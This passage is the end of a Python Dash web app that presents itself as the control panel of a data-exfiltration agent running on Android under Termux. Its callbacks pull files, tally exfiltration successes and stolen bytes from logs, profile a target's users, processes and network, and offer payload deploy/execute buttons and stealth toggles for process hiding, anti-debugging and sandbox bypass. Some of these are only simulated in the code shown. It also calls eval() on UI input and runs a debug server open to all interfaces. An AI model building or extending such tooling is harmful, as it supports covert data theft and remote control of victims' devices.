        )
    return dash.no_update, dash.no_update, dash.no_update


@app.callback(
    Output("download-file-data", "data"),
    Input({'type': 'download-file-button', 'index': ALL}, 'n_clicks'),
    State('found-files-table', 'data'),
    prevent_initial_call=True
)
def download_file(download_n_clicks_list, table_data):
    if not any(download_n_clicks_list):
        raise dash.exceptions.PreventUpdate

    ctx = dash.callback_context
    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate

    trigger_id_dict = json.loads(ctx.triggered[0]['prop_id'])
    clicked_index = trigger_id_dict['index']
    source_type = trigger_id_dict.get('source', 'local')

    if clicked_index is not None and clicked_index < len(table_data):
        file_item = table_data[clicked_index]
        file_full_path = file_item.get('full_path')

        if file_full_path:
            file_content_base64 = ""
            filename = os.path.basename(file_item['path'])

            try:
                if source_type == 'local' and not isinstance(global_file_explorer, BaseMockExplorer):
                    file_content_base64 = global_file_explorer.download_file_base64(file_full_path)
                elif source_type == 'web' and not isinstance(global_web_explorer, BaseMockExplorer):
                    file_content_base64 = global_web_explorer.download_file_base64_from_url(file_full_path)
                else:
                    _GLOBAL_MODULE_LOGGER.log_error(f"Explorer for '{source_type}' not available or in mock mode for download.")
                    raise dash.exceptions.PreventUpdate

                if file_content_base64 and not file_content_base64.startswith("[ERROR]"):
                    decoded_content = base64.b64decode(file_content_base64.encode('utf-8'))
                    _GLOBAL_MODULE_LOGGER.log_info(f"Downloading '{file_item['path']}'.")
                    return dcc.send_bytes(decoded_content, filename)
                else:
                    _GLOBAL_MODULE_LOGGER.log_error(f"Failed to get file content (Base64) for '{file_full_path}': {file_content_base64}")
                    raise dash.exceptions.PreventUpdate
            except Exception as e:
                _GLOBAL_MODULE_LOGGER.log_critical(f"Error during file download for '{file_full_path}': {e}")
                raise dash.exceptions.PreventUpdate
    raise dash.exceptions.PreventUpdate


@app.callback(
    # Met à jour le buffer caché des logs de l'explorateur
    Output('_hidden_explorer_logs_buffer', 'children'), 
    # Met à jour le buffer caché des logs du tableau de bord
    Output('_hidden_dashboard_live_logs_buffer', 'children'), 
    Output('explorer-log-last-index', 'data'), # Met à jour l'index des logs
    [Input('interval-explorer-logs', 'n_intervals'),
     Input('interval-dashboard-refresh', 'n_intervals')],
    State('explorer-log-last-index', 'data'),
    prevent_initial_call=False
)
def refresh_all_live_logs(n_intervals_explorer, n_intervals_dashboard, current_log_indices):
    if global_log_streamer is None:
        error_msg = "Live logs not available (LogStreamer module missing)."
        return error_msg, error_msg, current_log_indices
        
    new_logs, new_total_index = global_log_streamer.get_logs(current_log_indices['file'])

    if new_logs:
        explorer_log_states['file_explorer']['logs'].extend(new_logs)
        current_log_indices['file'] = new_total_index
    
    all_logs_content = "\n".join(explorer_log_states['file_explorer']['logs'])

    return all_logs_content, all_logs_content, current_log_indices # Retourne le même contenu pour les deux buffers

@app.callback(
    Output('agent-stats-store', 'data'),
    [Input('interval-dashboard-refresh', 'n_intervals')],
    State('agent-stats-store', 'data'),
    prevent_initial_call=False
)
def update_dashboard_stats(n_intervals, current_stats):
    if current_stats['agent_status'] == 'RUNNING' and global_log_streamer:
        # Assurez-vous que global_log_streamer.get_logs() retourne une liste de logs et l'index total
        # et que le premier élément est bien le contenu des logs
        log_content = global_log_streamer.get_logs()[0]
        files_scanned_count = sum(1 for line in log_content if "Scanning:" in line)
        files_matched_count = sum(1 for line in log_content if "MATCH:" in line)
        exfil_success_count = sum(1 for line in log_content if "Exfiltration SUCCESS" in line)
        exfil_failed_count = sum(1 for line in log_content if "Exfiltration FAILED" in line)
        
        data_exfiltrated_bytes = 0
        for line in log_content:
            match = re.search(r"Exfiltrated (\d+) bytes", line)
            if match:
                data_exfiltrated_bytes += int(match.group(1))

        current_stats['files_scanned'] = files_scanned_count
        current_stats['files_matched'] = files_matched_count
        current_stats['exfil_success_count'] = exfil_success_count
        current_stats['exfil_failed_count'] = exfil_failed_count
        current_stats['data_exfiltrated_bytes'] = data_exfiltrated_bytes
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    return current_stats


@app.callback(
    [Output('system-profiler-status', 'children'),
     Output('os-info-output', 'children'),
     Output('cpu-info-output', 'children'),
     Output('memory-info-output', 'children'),
     Output('disk-info-table', 'data'),
     Output('network-info-output', 'children'),
     Output('users-info-table', 'data'),
     Output('processes-info-table', 'data')],
    [Input('request-system-info-button', 'n_clicks')],
    prevent_initial_call=True
)
def request_system_info(n_clicks):
    if n_clicks == 0:
        raise dash.exceptions.PreventUpdate

    _GLOBAL_MODULE_LOGGER.log_info("Requête de profilage système initiée.")
    status_message = html.Pre("Requesting system information from the agent...", style=CYBER_STATUS_INFO)

    try:
        system_data = global_system_profiler.collect_system_info()

        if system_data.get("status") and "ERROR" in system_data["status"]:
            error_msg = f"ERROR COLLECTING SYSTEM INFO: {system_data.get('status', 'Unknown Error')}"
            if system_data.get('details'):
                error_msg += f" Details: {system_data['details']}"
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return (
                html.Pre(error_msg, style=CYBER_STATUS_ERROR),
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                [],
                html.Pre("N/A", style=CYBER_STATUS_ERROR),
                [],
                []
            )

        os_info_str = f"System: {system_data.get('os_info', {}).get('system', 'N/A')}\n" \
                      f"Full Name: {system_data.get('os_info', {}).get('os_name_full', 'N/A')}\n" \
                      f"Release: {system_data.get('os_info', {}).get('release', 'N/A')}\n" \
                      f"Version: {system_data.get('os_info', {}).get('version', 'N/A')}\n" \
                      f"Machine: {system_data.get('os_info', {}).get('machine', 'N/A')}\n" \
                      f"Processor: {system_data.get('os_info', {}).get('processor', 'N/A')}\n" \
                      f"Architecture: {system_data.get('os_info', {}).get('architecture', 'N/A')}\n" \
                      f"Hostname: {system_data.get('hostname', 'N/A')}"
        
        cpu_info_str = f"Model: {system_data.get('cpu_info', {}).get('model_name', 'N/A')}\n" \
                       f"Logical Cores: {system_data.get('cpu_info', {}).get('logical_cores', 'N/A')}\n" \
                       f"Physical Cores: {system_data.get('cpu_info', {}).get('physical_cores', 'N/A')}\n" \
                       f"CPU Usage: {system_data.get('cpu_info', {}).get('cpu_usage_percent', 'N/A')} % (Live data not available via static report)"

        mem_info = system_data.get('memory_info', {})
        memory_info_str = f"Total Memory: {mem_info.get('total_gb', 'N/A')} GB\n" \
                          f"Free Memory: {mem_info.get('free_gb', 'N/A')} GB\n" \
                          f"Available Memory: {mem_info.get('available_gb', 'N/A')} GB\n" \
                          f"Used Percent: {mem_info.get('used_percent', 'N/A')} %"

        network_info = system_data.get('network_info', {})
        network_info_str = f"Default Gateway: {network_info.get('default_gateway', 'N/A')}\n" \
                           f"DNS Servers: {', '.join(network_info.get('dns_servers', [])) if network_info.get('dns_servers') else 'N/A'}\n\n" \
                           f"Interfaces:\n"
        if network_info.get('interfaces'):
            for iface_name, iface_data in network_info['interfaces'].items():
                network_info_str += f"  - {iface_name} (Status: {iface_data.get('status', 'N/A')}, MAC: {iface_data.get('mac_address', 'N/A')}):\n"
                if iface_data.get('ipv4_addresses'):
                    for addr in iface_data['ipv4_addresses']:
                        network_info_str += f"    IPv4: {addr}\n"
                if iface_data.get('ipv6_addresses'):
                    for addr in iface_data['ipv6_addresses']:
                        network_info_str += f"    IPv6: {addr}\n"
                if not iface_data.get('ipv4_addresses') and not iface_data.get('ipv6_addresses'):
                    network_info_str += "    No IP addresses found.\n"
        else:
            network_info_str += "  No network interfaces found."

        final_status = html.Pre(f"System Information Collected at {system_data.get('timestamp', 'N/A')}", style=CYBER_STATUS_BOX_STYLE)
        _GLOBAL_MODULE_LOGGER.log_info("Informations système collectées avec succès.")
        
        return (
            final_status,
            html.Pre(os_info_str, style=CYBER_STATUS_BOX_STYLE),
            html.Pre(cpu_info_str, style=CYBER_STATUS_BOX_STYLE),
            html.Pre(memory_info_str, style=CYBER_STATUS_BOX_STYLE),
            system_data.get('disk_info', []),
            html.Pre(network_info_str, style=CYBER_STATUS_BOX_STYLE),
            system_data.get('users_info', []),
            system_data.get('processes_info', []) # Correction ici
        )

    except Exception as e:
        import traceback
        error_trace = traceback.format_exc()
        error_msg = f"CRITICAL ERROR during system profiling: {e}\n{error_trace}"
        _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
        return (
            html.Pre(error_msg, style=CYBER_STATUS_ERROR),
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            [],
            html.Pre("N/A", style=CYBER_STATUS_ERROR),
            [],
            []
        )

@app.callback(
    Output('payload-status-output', 'children'),
    # FIX: Ces Inputs doivent pointer vers les inputs cachés pour leurs valeurs
    Input('deploy-payload-button', 'n_clicks'),
    Input('execute-payload-button', 'n_clicks'),
    Input('remove-payload-button', 'n_clicks'),
    State('payload-url-hidden', 'value'), # Utiliser la version cachée
    State('payload-path-hidden', 'value'), # Utiliser la version cachée
    prevent_initial_call=True
)
def handle_payload_actions(deploy_n, execute_n, remove_n, payload_url, payload_path):
    ctx = dash.callback_context
    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate
    
    button_id = ctx.triggered[0]['prop_id'].split('.')[0]
    
    if button_id == 'deploy-payload-button':
        status = f"Simulating DEPLOY payload from {payload_url} to {payload_path}..."
        _GLOBAL_MODULE_LOGGER.log_info(status)
        return html.Pre(status, style=CYBER_STATUS_INFO)
    elif button_id == 'execute-payload-button':
        status = f"Simulating EXECUTE payload at {payload_path}..."
        _GLOBAL_MODULE_LOGGER.log_info(status)
        return html.Pre(status, style=CYBER_STATUS_INFO)
    elif button_id == 'remove-payload-button':
        status = f"Simulating REMOVE payload at {payload_path}..."
        _GLOBAL_MODULE_LOGGER.log_info(status)
        return html.Pre(status, style=CYBER_STATUS_INFO)
    
    return dash.no_update

@app.callback(
    Output('stealth-status-output', 'children'),
    Input('apply-stealth-button', 'n_clicks'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def apply_stealth_settings(n_clicks, hide_process_val_str, anti_debug_val_str, sandbox_bypass_val_str):
    if n_clicks == 0:
        raise dash.exceptions.PreventUpdate

    hide_process = eval(hide_process_val_str) if isinstance(hide_process_val_str, str) else hide_process_val_str
    anti_debug = eval(anti_debug_val_str) if isinstance(anti_debug_val_str, str) else anti_debug_val_str
    sandbox_bypass = eval(sandbox_bypass_val_str) if isinstance(sandbox_bypass_val_str, str) else sandbox_bypass_val_str

    status = "Applying Stealth Settings:\n"
    status += f"  - Hide Process: {'Enabled' if 'hide_process' in hide_process else 'Disabled'}\n"
    status += f"  - Anti-Debugging: {'Enabled' if 'anti_debug' in anti_debug else 'Disabled'}\n"
    status += f"  - Sandbox Bypass: {'Enabled' if 'sandbox_bypass' in sandbox_bypass else 'Disabled'}" 

    _GLOBAL_MODULE_LOGGER.log_info(status)
    
    return html.Pre(status, style=CYBER_STATUS_INFO)

# --- Activation retardée de LogStreamer via callback sur dcc.Store ---
# Ce callback s'exécute une seule fois au chargement initial de l'application
@app.callback(
    Output('log-streamer-init-trigger', 'data'), # Un output bidon pour déclencher le callback
    Input('log-streamer-init-trigger', 'data'), # L'input est la valeur initiale du Store (0)
    prevent_initial_call=False # Ceci permet au callback de s'exécuter au chargement initial
)
def initialize_log_streamer(data):
    global global_log_streamer
    # Utiliser l'instance globale du sys pour la persistance entre les rechargements Dash
    if not hasattr(sys, '_log_streamer_active_flag'):
        sys._log_streamer_active_flag = False

    if global_log_streamer and not sys._log_streamer_active_flag:
        try:
            global_log_streamer.start_capturing()
            sys._log_streamer_active_flag = True
            # Le message d'activation est déjà géré par LogStreamer lui-même
        except Exception as e:
            _GLOBAL_MODULE_LOGGER.log_critical(f"Impossible d'activer LogStreamer via callback: {e}. Les logs en direct ne seront pas disponibles.")
    elif isinstance(global_log_streamer, LogStreamer) and sys._log_streamer_active_flag:
        _GLOBAL_MODULE_LOGGER.log_info("LogStreamer global déjà actif.")
    else: # Si c'est un MockLogStreamer (en cas d'ImportError initial)
        _GLOBAL_MODULE_LOGGER.log_warning("LogStreamer est une implémentation mock. La capture de logs en direct ne sera pas possible.")
    
    # Ne pas renvoyer de mise à jour pour éviter une boucle, la valeur initiale est suffisante
    raise dash.exceptions.PreventUpdate


if __name__ == '__main__':
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] --- AGENT EXFILTRATION :: CYBER OPS HUB V2.6 PRO (ULTIMATE FIX) ---")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] Ensure Python, pip, and Dash are installed in Termux.")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] This script is located at: {AGENT_DIR}")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] To launch the control panel, navigate to the agent directory and execute:")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel]    cd {AGENT_DIR} && nohup python3 -u control_panel.py > control_panel.log 2>&1 &")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] Access the interface in your Android browser at : http://127.0.0.1:8050")
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] [+] Keep this Termux terminal open while the interface is active.")

    try:
        app.run(host='0.0.0.0', debug=True, port=8050)
    except Exception as e:
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR LAUNCHING DASH SERVER: {e}")
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Verify if the port is already in use or if Dash is properly installed.")


